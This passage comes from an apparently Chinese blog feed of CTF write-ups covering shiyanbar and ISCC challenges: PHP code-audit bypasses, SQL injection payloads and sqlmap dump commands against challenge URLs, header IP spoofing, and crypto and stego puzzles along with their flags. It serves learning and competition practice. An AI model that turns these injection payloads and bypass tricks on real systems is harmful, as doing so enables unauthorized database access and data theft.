class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;p&gt;You password must be alphanumeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">&#123;</span><br><span class="line">die(&#39;Flag: &#39; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&#39;&lt;p&gt;*-* have not been found&lt;&#x2F;p&gt;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;p&gt;Invalid password&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一道代码审计题，根据if语句要求，password必须大于9999999，但是长度小于8，而且还要等于*-*<br>根据提示科学计数法，再利用%00截断，因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配，构造password=1e8%00*-*<br>另一种方法也是利用题目中的函数遇到数字会返回NULL来绕过<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4s56ahaj30w108jt9v.jpg" alt="image">   </p><h4 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h4><p>查看源码发现index.txt文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">$conn &#x3D; mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user &#x3D; $_POST[user];</span><br><span class="line">$pass &#x3D; md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;select pw from php where user&#x3D;&#39;$user&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$row &#x3D; mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">&#x2F;&#x2F;echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;Logged in! Key:************** &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据源码可以看到两处特别需要重视的地方，很明显该sql语句存在注入漏洞，但是密码栏不能通过一般的注入来绕过，但是可以发现，只要满足了（$row[pw]) &amp;&amp;(!strcasecmp($pass,$row[pw])就可以拿到flag，也就是说，我们输入的$pass与从数据库取出来的pw一致就行，我们可以控制$pass的值，但是貌似不知道数据库中pw的值，但是我们可以直接用union select ‘某一个经过md5加密后的字符串’#来自己随意设定密码，注意这里一定是经过md5加密，不然会出错。  </p><p>构造语句:’ and 0=1 union select ‘529CA8050A00180790CF88B63468826A’#</p><p>密码：hehe</p><p>就拿到flag了。  </p><h4 id="php大法"><a href="#php大法" class="headerlink" title="php大法"></a>php大法</h4><p>页面提示：index.php.txt<br>打开得到源码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;\\get传参的id值不能等于hackerDJ</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);\\对id值进行一次解码</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure><p>值得一提的是我们在网页输入url时已经进行了一次url解码，所以这里解码了两次得到的hackerDJ，所以我们传入的原始值应该是两次url编码后的hackerDJ<br>构造url: index.php?id=%2568ackerDJ<br>flag: DUTCTF{PHP_is_the_best_program_language}</p><h4 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h4><p>打开链接后显示：<br><img src="http://t.cn/R1HUSzY" alt="image"><br>发现只有一个输入框，什么也没有，查看源代码，发现有一个隐藏的输入框：<br><img src="http://t.cn/R1HUWvF" alt="image"><br>这时按F12，修改type=”hidden”为”text”后就能看到输入框了，其中value=0,这时候还是不知道另外一个输入框该填什么，然后试着修改了一下value的值，令value=1,再提交一下，就看到进一步的提示了：<br><img src="http://t.cn/R1HUe2a" alt="image"><br>这时复制pin值到输入框里就拿到flag  </p><h4 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h4><p>试着先输入1，再输入1’，页面报语法错误，再输入1 ‘页面出现SQLi detected!，推出空格被它过滤了<br>用SQLmap跑一下<br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –dbs<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryaa78kycj30b4022741.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –tables -D web1<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryab0jtbaj30b601x0nc.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –dump -C flag -T flag -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg" alt="image"></p><h4 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h4><p>输入1，页面显示hello，输入1’，页面报错<br>sqlmap跑起来<br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –dbs<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryafzy505j30f5023dfl.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –tables -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryahgdnsjj30aw02i741.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –dump -C flag -T flag -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg" alt="image"></p><h4 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h4><p>这道题也是sql注入，输入1，页面显示正常，输出1’，页面报错</p><p>之后通过输入查表字段，发现union select 被过滤了,这是想到用两个union表示</p><p>重复输入union select后发现空格也被过滤了，继续用两个空格代替一个空格<br>1.查询当前数据库</p><p>1’  unionunion  selectselect  database()’  </p><p>2.查询数据库中的表</p><p>1’  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  ‘1’=’1  </p><p>3.查询字段名</p><p>1’ unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name=’flag   </p><p>4.最后构造出1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere  ‘1’=’1<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryamkr5hwj30kp062aab.jpg" alt="image"> </p><h4 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="你真的会PHP吗？"></a>你真的会PHP吗？</h4><p>抓包发现提示：<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryark9iifj30zu07jmy9.jpg" alt="image"><br>hint:6c525af4059b4fe7d8c33a.txt<br>打开发现源码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info &#x3D; &quot;&quot;; </span><br><span class="line">$req &#x3D; [];</span><br><span class="line">$flag&#x3D;&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&#39;number&#39;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key &#x3D;&gt; $value) &#123; </span><br><span class="line">        $value &#x3D; trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] &#x3D; addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number &#x3D; strval($number); </span><br><span class="line">    $i &#x3D; 0; </span><br><span class="line">    $j &#x3D; strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !&#x3D;&#x3D; $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&#39;number&#39;]))&#123;&#x2F;&#x2F;这里判断的是未经trim()和addslashes()处理过的变量</span><br><span class="line">    </span><br><span class="line">   $info&#x3D;&quot;sorry, you cann&#39;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&#39;number&#39;]!&#x3D;strval(intval($req[&#39;number&#39;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info &#x3D; &quot;number must be equal to it&#39;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 &#x3D; intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 &#x3D; intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!&#x3D;$value2)&#123;</span><br><span class="line">          $info&#x3D;&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info &#x3D; &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info&#x3D;$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure><p>POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。<br>绕过方法：<br>1.<strong>利用intval函数溢出绕过</strong><br>$number不是数字；$number==strval(intval($number))；$number不是回文数</p><p>这里要看下操作系统，32位有符号数int范围-2147483648 ~ 2147483647；64位 - 9223372036854775808~9223372036854775807<br>可用payload<br>32位：2147483647%00；%002147483647；2147483647%20<br>64位：9223372036854775807%00；%009223372036854775807；9223372036854775807%20<br>%00可以放在数字前后，%20只能放在后面；这里的%00或者是%20可以将数字解释为字符串<br>2.<strong>用科学计数法构造0=0</strong><br>因为要求不能为回文数，但又要满足intval($req[“number”])=intval(strrev($req[“number”]))，所以我们采用科学计数法构造poc为number=0e-0%00，这样的话我们就可以绕过</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;实验吧ctf题小计&quot;&gt;&lt;a href=&quot;#实验吧ctf题小计&quot; class=&quot;headerlink&quot; title=&quot;实验吧ctf题小计&quot;&gt;&lt;/a&gt;实验吧ctf题小计&lt;/h3&gt;&lt;h4 id=&quot;天下武功唯快不破&quot;&gt;&lt;a href=&quot;#天下武功唯快不破&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ctf" scheme="http://yoursite.com/child/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>iscc ctf题小记</title>
    <link href="http://yoursite.com/child/2018/05/14/iscc%20ctf%E9%A2%98%E5%B0%8F%E8%AE%B0(1)/"/>
    <id>http://yoursite.com/child/2018/05/14/iscc ctf题小记(1)/</id>
    <published>2018-05-14T03:35:12.000Z</published>
    <updated>2018-06-13T13:22:43.417Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ISCC-CTF小计（更新中）"><a href="#ISCC-CTF小计（更新中）" class="headerlink" title="ISCC CTF小计（更新中）"></a>ISCC CTF小计（更新中）</h3><p>上周经班上同学说起，才知道最近有个信息安全竞赛，题目比较基础，就尝试着做了一下，做的不多  </p><h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h4><h5 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h5><p>下载附件，得到一张图片<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgy3w9yq7j30ia0ekq3d.jpg" alt="image">  </p><p>看到手指指向的地方想到flag可能就在图片下面，根据经验，应该是修改图片宽度隐藏了flag    </p><p>用winhex打开图片<br>这里就要了解一些png图片结构的一些知识了<br><a href="https://blog.csdn.net/joqian/article/details/8290389">推荐阅读分析PNG图像结构</a> </p><p>找到表示图片长度宽度的十六进制码<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frfl1zjchkj30s90fewh3.jpg" alt="image">  </p><p>00 00 02 72 是图片的宽度<br>00 00 01 F4 是图片的长度<br>明显图片长宽并不标准，我们将长度修改为00 00 02 72，保存 得到flag<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frfl8w7fnhj30he0het94.jpg" alt="image">  </p><h5 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h5><p>题目给了一串数字<strong>69742773206561737921</strong><br>观察发现每一位都是在0到9之间，想到了十进制编码，百度搜了一下，看见了这篇文章实验吧的一道题<br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/7774803.html">CTF—密码学入门第六题 古典密码</a><br>于是把密文改成了<br>&amp;#69&amp;#74&amp;#27&amp;#73&amp;#20&amp;#65&amp;#61&amp;#73&amp;#79&amp;#21用十进制解码发现是乱的，在想会不会是十六进制，用十六进制解码成功得到flag  </p><h5 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h5><p>压缩包解压得到<br>秘密电报：<br>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA<br>知识就是力量不是培根说的吗？培根密码无误<br><img src="https://images2017.cnblogs.com/blog/1100338/201710/1100338-20171017235425162-1445912366.png" alt="image"><br><a href="https://netair.xyz/tools/%e5%9f%b9%e6%a0%b9%e5%af%86%e7%a0%81%e5%8a%a0%e5%af%86%e8%a7%a3%e5%af%86.html">放到在线解密网站得到flag</a>  </p><h5 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h5><p>打开网页<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frfn2kss5kj31h708yjue.jpg" alt="image"><br>题目提示：刹那便是永恒。南无阿弥陀佛。想到了土豆文<br>再看看页面上的应该是base64码</p><p>多次解密得到一串不是base64的值（注意解码中的坑每次解码都需要将末尾的%3D，也就是“=”的url编码去掉），得到一串密文  </p><blockquote><p>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4%0AB5r<br>KClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z%0AiN+jkp<br>b6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc</p></blockquote><p>刚开始不知道是什么，问了一下做出来的同学，才知道是AES加密，把%0A换成换行符，找一个在线AES解码的平台得到密文:   </p><p>答案就是后面这句但已加密  缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</p><p>是土豆文没错<br><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a><br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgf3wdyztj30yj0erjrx.jpg" alt="image"> </p><h5 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h5><p>又是一张图片<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frgfq4hc3ij30g40g4gnc.jpg" alt="image"><br>试了很多办法都没用，后面用winhex打开，发现文件尾部有一串Unicode编码  </p><blockquote><p>&#92;&#117;&#48;&#48;&#54;&#54;&#92;&#117;&#48;&#48;&#54;&#99;&#92;&#117;&#48;&#48;&#54;&#49;&#92;&#117;&#48;&#48;&#54;&#55;&#92;&#117;&#48;&#48;&#55;&#98;&#92;&#117;&#48;&#48;&#54;&#57;&#92;&#117;&#48;&#48;&#55;&#51;&#92;&#117;&#48;&#48;&#54;&#51;&#92;&#117;&#48;&#48;&#54;&#51;&#92;&#117;&#48;&#48;&#50;&#48;&#92;&#117;&#48;&#48;&#54;&#57;&#92;&#117;&#48;&#48;&#55;&#51;&#92;&#117;&#48;&#48;&#50;&#48;&#92;&#117;&#48;&#48;&#54;&#54;&#92;&#117;&#48;&#48;&#55;&#53;&#92;&#117;&#48;&#48;&#54;&#101;&#92;&#117;&#48;&#48;&#55;&#100;</p></blockquote><p>Unicode解码得到</p><blockquote><p>\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d</p></blockquote><p>再转一次得到flag：flag{iscc is fun}  </p><h5 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h5><p>提示：凯撒十三世在学会使用键盘后<br>密文：ebdgc697g95w3<br>猜测是凯撒密码加键盘密码<br>打开在线<a href="https://www.ctftools.com/down/down/passwd/">凯撒密码网站</a>   移位数应该是13<br>刚开始以为是解密，解了半天什么都没有，结果是加密。。。加密得到 roqtp697t95j3<br>键盘密码：<br>我们注意到大键盘区所有的字母上面都有其对应的数字，这个位置几乎在所有的键盘都是相同的。所以我们可以利用这一点应用单表替换的方法进行加密：<br>1 2 3 4 5 6 7 8 9 0<br>Q W E R T Y U I O P<br>A S D F G H J K L<br>Z X C V B N M  </p><p>我们根据上表可以得出，Q是1下面的第一个，A是1下面的第二个……以此类推，每一个字母都会有其对应的数字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">A 12</span><br><span class="line">B 53</span><br><span class="line">C 33</span><br><span class="line">D 32</span><br><span class="line">E 31</span><br><span class="line">F 42</span><br><span class="line">G 52</span><br><span class="line">H 62</span><br><span class="line">I 81</span><br><span class="line">J 72</span><br><span class="line">K 82</span><br><span class="line">L 92</span><br><span class="line">M 73</span><br><span class="line">N 63</span><br><span class="line">O 91</span><br><span class="line">P 01</span><br><span class="line">Q 11</span><br><span class="line">R 41</span><br><span class="line">S 22</span><br><span class="line">T 51</span><br><span class="line">U 71</span><br><span class="line">V 43</span><br><span class="line">W 21</span><br><span class="line">X 23</span><br><span class="line">Y 61</span><br><span class="line">Z 13</span><br></pre></td></tr></table></figure><p>第一个数字代表横向（X坐标）的位置，第二个数字代表纵向（Y坐标）的位置。<br>得到flag：yougotme   </p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h5><p>进去发现有一个输入框，随便输入一点<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frggckws36j30dq035glh.jpg" alt="image"><br>那输入数字吧  ，发现只能输入3位，提交<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frggeqpogmj30b704b3yd.jpg" alt="image"><br>查看html代码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv&#x3D;Content-Type content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">                &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; maxlength&#x3D;&quot;3&quot; name&#x3D;&quot;v&quot;&#x2F;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>数字太小了！   </p><p>输入框限制了数字位数，修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;text&quot; maxlength&#x3D;&quot;10&quot; name&#x3D;&quot;v&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>再输入一个较大的数，得到flag：key is 768HKyu678567&amp;*&amp;K  </p><h5 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h5><p>此道为代码审计题  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(&#39;2.php&#39;);</span><br><span class="line">$flag&#x3D;&#39;&#123;***************&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;password&#39;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&#39;password&#39;], $flag) &#x3D;&#x3D; 0)  </span><br><span class="line">        die(&#39;Flag: &#39;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &#39;Invalid password&#39;;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>题目要求是get传参password，这里涉及到strcmp函数的漏洞  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure><p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0<br>该漏洞是用于php5.3之前的版本<br>该函数要求是上传字符串进行比较，当我们传入非法参数时，如数组，在php5.3之前函数会报错，return 0！刚好和两个字符串相等返回0的结果一样<br>于是我们在url中输入？password[]=1,利用数组是非法参数报错，得到flag： ISCC{iscc_ef3w5r5tw_5rg5y6s3t3}   </p><h5 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h5><p>提示：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？<br>只允许本地访问，那我们就用bp抓包伪造ip<br><a href="https://blog.csdn.net/jrn1012/article/details/39763819">推荐文章网络安全之IP伪造</a><br>添加X-Forwarded-For请求头，修改IP地址为127.0.0.1<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frgh20mp3oj311m0gegng.jpg" alt="image"><br>得到flag<br>后面才发现。。。直接F12，flag就在html代码中。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td 